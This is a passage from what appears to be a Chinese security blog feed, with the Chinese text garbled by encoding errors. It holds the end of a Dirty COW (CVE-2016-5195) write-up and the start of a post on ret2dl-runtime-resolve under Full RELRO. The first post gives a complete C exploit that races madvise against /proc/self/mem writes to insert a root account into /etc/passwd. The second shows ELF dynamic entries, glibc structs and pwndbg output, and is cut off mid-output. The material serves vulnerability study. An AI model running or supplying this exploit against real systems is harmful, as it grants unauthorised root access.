¸çœ¼ä¸­ï¼Œè¿™æ˜¯ä¸€å—ç”¨æ¥è¯»çš„å†…å­˜é¡µï¼Œæ‰€ä»¥ä¼šæ­£å¸¸è¿”å›å¤„å†…å­˜é¡µï¼Œä½†æ˜¯åœ¨<code>access_remote_vm</code>ä¸­åˆ¤æ–­è¯»å†™ä½¿ç”¨çš„æ˜¯<code>write</code>å˜é‡ï¼Œæ‰€ä»¥å®é™…ä¸Šæˆ‘ä»¬ä¾æ—§æ˜¯åœ¨å¾€å†…éƒ¨è¿›è¡Œå†™ï¼Œè‡³æ­¤æˆåŠŸå®ç°äº†è¶Šæƒå†™ã€‚</p><h2 id="ç»¼ä¸Šï¼Œå¯å¾—exp"><a href="#ç»¼ä¸Šï¼Œå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šï¼Œå¯å¾—exp"></a>ç»¼ä¸Šï¼Œå¯å¾—exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">passwd_st</span>;</span></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">char</span> *fake_user;</span><br><span class="line"><span class="keyword">int</span> fake_user_length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *username;</span><br><span class="line">    <span class="keyword">char</span> *hash;</span><br><span class="line">    <span class="keyword">int</span> user_id;</span><br><span class="line">    <span class="keyword">int</span> group_id;</span><br><span class="line">    <span class="keyword">char</span> *info;</span><br><span class="line">    <span class="keyword">char</span> *home_dir;</span><br><span class="line">    <span class="keyword">char</span> *shell;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">info</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .user_id = <span class="number">0</span>,</span><br><span class="line">        .group_id = <span class="number">0</span>,</span><br><span class="line">        .info = <span class="string">&quot;196082&quot;</span>,</span><br><span class="line">        .home_dir = <span class="string">&quot;/root&quot;</span>,</span><br><span class="line">        .shell = <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">writeThread</span><span class="params">(<span class="keyword">void</span> *argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="keyword">off_t</span>)<span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, fake_user, fake_user_length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> passwd_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./dirty username password&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do not forget to make a backup for the /etc/passwd by yourself&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info.username = argv[<span class="number">1</span>];</span><br><span class="line">    info.hash = crypt(argv[<span class="number">2</span>], argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    fake_user_length = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,</span><br><span class="line">                                info.username,</span><br><span class="line">                                info.hash,</span><br><span class="line">                                info.user_id,</span><br><span class="line">                                info.group_id,</span><br><span class="line">                                info.info,</span><br><span class="line">                                info.home_dir,</span><br><span class="line">                                info.shell);</span><br><span class="line">    fake_user = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(fake_user_length + <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(fake_user, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,</span><br><span class="line">            info.username,</span><br><span class="line">            info.hash,</span><br><span class="line">            info.user_id,</span><br><span class="line">            info.group_id,</span><br><span class="line">            info.info,</span><br><span class="line">            info.home_dir,</span><br><span class="line">            info.shell);</span><br><span class="line"></span><br><span class="line">    passwd_fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of /etc/passwd: %d\n&quot;</span>, passwd_fd);</span><br><span class="line"></span><br><span class="line">    fstat(passwd_fd, &amp;passwd_st);</span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, passwd_st.st_size, PROT_READ, MAP_PRIVATE, passwd_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>å‚è€ƒé“¾æ¥ï¼š</p><p>â€‹    <a class="link"   href="https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/" >https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://elixir.bootlin.com/linux/v4.4/source" >https://elixir.bootlin.com/linux/v4.4/source<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;CVE-2016-5195å°±æ˜¯éå¸¸å‡ºåçš„&lt;code&gt;Dirty COW&lt;/code&gt;ï¼Œä¿—ç§°&lt;code&gt;è„ç‰›æ¼æ´&lt;/code&gt;ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="page fault" scheme="https://cv196082.gitee.io/tags/page-fault/"/>
    
    <category term="COW" scheme="https://cv196082.gitee.io/tags/COW/"/>
    
    <category term="Race condition" scheme="https://cv196082.gitee.io/tags/Race-condition/"/>
    
  </entry>
  
  <entry>
    <title>dl-runtime-resolveé‡æ¸©</title>
    <link href="https://cv196082.gitee.io/2023/07/28/dl-runtime-resolve/"/>
    <id>https://cv196082.gitee.io/2023/07/28/dl-runtime-resolve/</id>
    <published>2023-07-28T14:27:42.000Z</published>
    <updated>2023-07-28T14:27:06.537Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨å…ˆå‰å…¶å®æˆ‘å·²ç»å†™è¿‡ä¸€ç¯‡<a href="https://cv196082.gitee.io/2022/02/03/ret2dl-runtime-resolve/">ret2dl-runtime-resolve</a>äº†ã€‚ä¸è¿‡åœ¨é‚£ç¯‡æ–‡ç« ä¸­å¹¶æ²¡æœ‰æåˆ°å½“<code>RELRO</code>çš„ç­‰çº§ä¸º<code>FULL</code>çš„æƒ…å†µä¸‹è¯¥å¦‚ä½•è¿›è¡Œåˆ©ç”¨æ–¹æ³•ã€‚åˆå› ä¸ºè¿™ç±»é¢˜ç›®ä¸€èˆ¬æ¥è¯´å°±æ˜¯æ¨¡æ¿é¢˜ç›®çš„ç¼˜æ•…æ‰€ä»¥æˆ‘ä¹Ÿå°±ä¸€ç›´æ²¡æœ‰æ”¾åœ¨å¿ƒä¸Šï¼ŒçŸ¥é“è¿™ä¸€æ¬¡å·…å³°æå®¢é‡åˆ°äº†è¿™æ ·ä¸€é“é¢˜ç›®ã€‚äº‹å…ˆéœ€è¦æåˆ°çš„æ˜¯ï¼Œè¿™é“é¢˜å…¶å®æ˜¯å…·æœ‰æ›´ç®€å•çš„è§£é¢˜æ–¹æ³•çš„ï¼Œé‚£å°±æ˜¯å°†gotè¡¨ä¸­readçš„å‡½æ•°åœ°å€å†™åˆ°bssä¸­ï¼Œéšåä¿®æ”¹ä¾¿å®œç›´æ¥è°ƒç”¨syscallå³å¯ã€‚ä¸è¿‡æ—¢ç„¶å–åå«<code>link_map</code>ä¹Ÿå¯¼è‡´æˆ‘å¤´é“åˆ°ä¸€ç›´å°è¯•<code>_dl_runtime_resolve</code>çš„æ–¹å¼å»è§£å†³ï¼Œæ‰€ä»¥åç»­çš„é¢˜ç›®éƒ½æ²¡çœ‹ã€‚</p><p>å› ä¸ºå†…æ ¸ç©çš„æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥ä¸‹æ¥çœ‹äº†é‚£ä¸€é“å†…æ ¸é¢˜ï¼Œé¢˜ç›®ç»™çš„é©±åŠ¨æ˜¯æ²¡æœ‰æ¼æ´çš„ï¼Œä½†æ˜¯å› ä¸ºæ²¡æœ‰åŠ ä»»ä½•é”çš„ç¼˜æ•…å¹¶ä¸”å†…æ ¸ç‰ˆæœ¬ä¸º5.10.xæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨<a href="https://cv196082.gitee.io/2022/09/06/kernel%E5%A0%86%E5%8D%A0%E4%BD%8D/">å †å ä½æŠ€æœ¯</a>ç›´æ¥é€ æˆUAFï¼Œè¿˜ç®—æ˜¯æ¯”è¾ƒç®€å•ï¼Œæ‰€ä»¥ä¸ä¼šå•ç‹¬å†™æ–‡ç« è¿›è¡Œå¤ç°ã€‚</p><h2 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h2><h3 id="Fullå’ŒPartialçš„åŒºåˆ«"><a href="#Fullå’ŒPartialçš„åŒºåˆ«" class="headerlink" title="Fullå’ŒPartialçš„åŒºåˆ«"></a>Fullå’ŒPartialçš„åŒºåˆ«</h3><p>é¦–å…ˆæœ€ç›´æ¥çš„åŒºåˆ«å°±æ˜¯åœ¨Fullçš„æƒ…å†µä¸‹gotè¡¨æ˜¯ä¸å¯å†™çš„ï¼Œå¹¶ä¸”æ‰€æœ‰ç¬¦å·çš„åœ¨åœ¨å¼€å§‹æ—¶å°±ä¼šè¢«è§£æï¼Œ<code>.got.plt</code>æ®µä¼šè¢«å®Œå…¨åˆå§‹åŒ–ä¸ºç›®æ ‡å‡½æ•°çš„æœ€ç»ˆåœ°å€ã€‚è¿™ä¹Ÿå°±å¯¼è‡´<code>link_map</code>å’Œ<code>_dl_runtime_resolve</code>ä¸ä¼šè¢«åŠ è½½ã€‚æ‰€ä»¥é¦–å…ˆéœ€è¦çš„å°±æ˜¯æ³„æ¼å‡º<code>link_map</code>å’Œ<code>_dl_runtime_resolve</code>å‡½æ•°ã€‚</p><h3 id="åˆ©ç”¨çš„å¿…è¦æ¡ä»¶"><a href="#åˆ©ç”¨çš„å¿…è¦æ¡ä»¶" class="headerlink" title="åˆ©ç”¨çš„å¿…è¦æ¡ä»¶"></a>åˆ©ç”¨çš„å¿…è¦æ¡ä»¶</h3><p>ä¸€ã€æ ˆæº¢å‡º</p><p>äºŒã€å­˜åœ¨ä¸€ä¸ªä»»æ„åœ°å€è¯»å–å¹¶ä¸”èƒ½å†™åˆ°ä»»æ„åœ°å€</p><p>å…¶å®æœ‰äº†å¦‚ä¸Šæ¡ä»¶ä¹‹åä¾æ—§å¯ä»¥é€‰æ‹©çš„æ›´ç®€å•çš„æ–¹å¼å°±æ˜¯è¯»å–gotè¡¨ä¸­<code>read</code>å‡½æ•°çš„åœ°å€ï¼Œå¹¶ä¸”è¿›è¡Œ<code>partial write</code>ä½¿å…¶æœ€ç»ˆæŒ‡å‘<code>syscall</code>ã€‚</p><h3 id="è·å–link-map"><a href="#è·å–link-map" class="headerlink" title="è·å–link_map"></a>è·å–link_map</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000600E10 0C 00 00 00 00 00 00 00 B0 04+Elf64_Dyn &lt;0Ch, 4004B0h&gt;                ; DT_INIT</span><br><span class="line">LOAD:0000000000600E20 0D 00 00 00 00 00 00 00 F4 07+Elf64_Dyn &lt;0Dh, 4007F4h&gt;                ; DT_FINI</span><br><span class="line">LOAD:0000000000600E30 19 00 00 00 00 00 00 00 E8 0D+Elf64_Dyn &lt;19h, 600DE8h&gt;                ; DT_INIT_ARRAY</span><br><span class="line">LOAD:0000000000600E40 1B 00 00 00 00 00 00 00 08 00+Elf64_Dyn &lt;1Bh, 8&gt;                      ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:0000000000600E50 1A 00 00 00 00 00 00 00 F0 0D+Elf64_Dyn &lt;1Ah, 600DF0h&gt;                ; DT_FINI_ARRAY</span><br><span class="line">LOAD:0000000000600E60 1C 00 00 00 00 00 00 00 08 00+Elf64_Dyn &lt;1Ch, 8&gt;                      ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:0000000000600E70 F5 FE FF 6F 00 00 00 00 98 02+Elf64_Dyn &lt;6FFFFEF5h, 400298h&gt;          ; DT_GNU_HASH</span><br><span class="line">LOAD:0000000000600E80 05 00 00 00 00 00 00 00 78 03+Elf64_Dyn &lt;5, 400378h&gt;                  ; DT_STRTAB</span><br><span class="line">LOAD:0000000000600E90 06 00 00 00 00 00 00 00 D0 02+Elf64_Dyn &lt;6, 4002D0h&gt;                  ; DT_SYMTAB</span><br><span class="line">LOAD:0000000000600EA0 0A 00 00 00 00 00 00 00 64 00+Elf64_Dyn &lt;0Ah, 64h&gt;                    ; DT_STRSZ</span><br><span class="line">LOAD:0000000000600EB0 0B 00 00 00 00 00 00 00 18 00+Elf64_Dyn &lt;0Bh, 18h&gt;                    ; DT_SYMENT</span><br><span class="line">LOAD:0000000000600EC0 15 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;15h, 0&gt;                      ; DT_DEBUG</span><br><span class="line">LOAD:0000000000600ED0 03 00 00 00 00 00 00 00 C0 0F+Elf64_Dyn &lt;3, 600FC0h&gt;                  ; DT_PLTGOT</span><br><span class="line">LOAD:0000000000600EE0 07 00 00 00 00 00 00 00 20 04+Elf64_Dyn &lt;7, 400420h&gt;                  ; DT_RELA</span><br><span class="line">LOAD:0000000000600EF0 08 00 00 00 00 00 00 00 90 00+Elf64_Dyn &lt;8, 90h&gt;                      ; DT_RELASZ</span><br><span class="line">LOAD:0000000000600F00 09 00 00 00 00 00 00 00 18 00+Elf64_Dyn &lt;9, 18h&gt;                      ; DT_RELAENT</span><br><span class="line">LOAD:0000000000600F10 18 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;18h, 0&gt;                      ; DT_BIND_NOW</span><br><span class="line">LOAD:0000000000600F20 FB FF FF 6F 00 00 00 00 01 00+Elf64_Dyn &lt;6FFFFFFBh, 1&gt;                ; DT_FLAGS_1</span><br><span class="line">LOAD:0000000000600F30 FE FF FF 6F 00 00 00 00 F0 03+Elf64_Dyn &lt;6FFFFFFEh, 4003F0h&gt;          ; DT_VERNEED</span><br><span class="line">LOAD:0000000000600F40 FF FF FF 6F 00 00 00 00 01 00+Elf64_Dyn &lt;6FFFFFFFh, 1&gt;                ; DT_VERNEEDNUM</span><br><span class="line">LOAD:0000000000600F50 F0 FF FF 6F 00 00 00 00 DC 03+Elf64_Dyn &lt;6FFFFFF0h, 4003DCh&gt;          ; DT_VERSYM</span><br><span class="line">LOAD:0000000000600F60 00 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;0&gt;                           ; DT_NULL</span><br></pre></td></tr></table></figure><p>åœ¨å…¥å£å¤„å­˜åœ¨ä¸€ä¸ª<code>.dynmic</code>å«åš<code>DT_DEBUG</code>ï¼Œç”±è°ƒè¯•å™¨ä½¿ç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxwordd_tag;<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>d_ptr</code>ä½ç½®åªæƒ³çš„æ˜¯<code>r_debug</code>ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* Version number for this protocol.  It should be greater than 0.  */</span></span><br><span class="line">    <span class="keyword">int</span> r_version;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">r_map</span>;</span><span class="comment">/* Head of the chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is the address of a function internal to the run-time linker,</span></span><br><span class="line"><span class="comment">       that will always be called when the linker begins to map in a</span></span><br><span class="line"><span class="comment">       library or unmap it, and again when the mapping change is complete.</span></span><br><span class="line"><span class="comment">       The debugger can set a breakpoint at this address if it wants to</span></span><br><span class="line"><span class="comment">       notice shared object mapping changes.  */</span></span><br><span class="line">    ElfW(Addr) r_brk;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="comment">/* This state value describes the mapping change taking place when</span></span><br><span class="line"><span class="comment">   the `r_brk&#x27; address is called.  */</span></span><br><span class="line">RT_CONSISTENT,<span class="comment">/* Mapping change is complete.  */</span></span><br><span class="line">RT_ADD,<span class="comment">/* Beginning to add a new object.  */</span></span><br><span class="line">RT_DELETE<span class="comment">/* Beginning to remove an object mapping.  */</span></span><br><span class="line">      &#125; r_state;</span><br><span class="line"></span><br><span class="line">    ElfW(Addr) r_ldbase;<span class="comment">/* Base address the linker is loaded at.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸­é—´çš„<code>r_map</code>å°±æ˜¯æŒ‡å‘<code>link_map</code>çš„åœ°å€äº†ã€‚</p><h3 id="è·å¾—-dl-runtime-resolve"><a href="#è·å¾—-dl-runtime-resolve" class="headerlink" title="è·å¾—_dl_runtime_resolve"></a>è·å¾—_dl_runtime_resolve</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥<code>link_map</code>å…¶å®æ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨çš„å½¢å¼ï¼Œè€Œä¸”å…¶ä¸­å­˜åœ¨ä¸€ä¸ªç›¸å½“æœ‰ç”¨çš„æˆå‘˜<code>l_info</code>ã€‚è€Œå…¶ä¸­çš„<code>DT_PLTGOT</code>çš„<code>d_tag</code>å­˜æ”¾çš„æ˜¯gotè¡¨çš„åœ°å€ï¼Œé‚£ä¹ˆå¯ä»¥ç»è¿‡å¤šæ¬¡çš„<code>l_next</code>çš„æŸ¥æ‰¾å¾—åˆ°libcçš„gotè¡¨åœ°å€è¿›è€Œè·å¾—<code>_dl_runtime_resolve</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x *((struct link_map*)0x7fd64bb592e0)-&gt;l_next-&gt;l_next-&gt;l_info[3]</span><br><span class="line"><span class="variable">$13</span> = &#123;</span><br><span class="line">  d_tag = 0x3,</span><br><span class="line">  d_un = &#123;</span><br><span class="line">    d_val = 0x7fd64bb05000,</span><br><span class="line">    d_ptr = 0x7fd64bb05000</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; telescope 0x7fd64bb05000</span><br><span class="line">00:0000â”‚  0x7fd64bb05000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x218bc0</span><br><span class="line">01:0008â”‚  0x7fd64bb05008 (_GLOBAL_OFFSET_TABLE_+8) â€”â–¸ 0x7fd64bb1c160 â€”â–¸ 0x7fd64b8ec000 â—‚â€” 0x3010102464c457f</span><br><span class="line">02:0010â”‚  0x7fd64bb05010 (_GLOBAL_OFFSET_TABLE_+16) â€”â–¸ 0x7fd64bb33c60 (_dl_runtime_resolve_xsave) â—‚â€” endbr64</span><br><span class="line">03:0018â”‚  0x7fd64bb05018 (*ABS*@got.plt) â€”â–¸ 0x7fd64ba89b20 (__strnlen_avx2) â—‚â€” endbr64</span><br><span class="line">04:0020â”‚  0x7fd64bb05020 (*ABS*@got.plt) â€”â–¸ 0x7fd64ba85750 (__rawmemchr_avx2) â—‚â€” endbr64</span><br><span class="line">05:0028â”‚  0x7fd64bb05028 (realloc@got.plt) â€”â–¸ 0x7fd64b914030 â—‚â€” endbr64</span><br><span class="line">06:0030â”‚  0x7fd64bb05030 (*ABS*@got.plt) â€”â–¸ 0x7fd64ba87970 (__strncasecmp_avx) â—‚â€” endbr64</span><br><span class="line">07:0038â”‚  0x7fd64bb05038 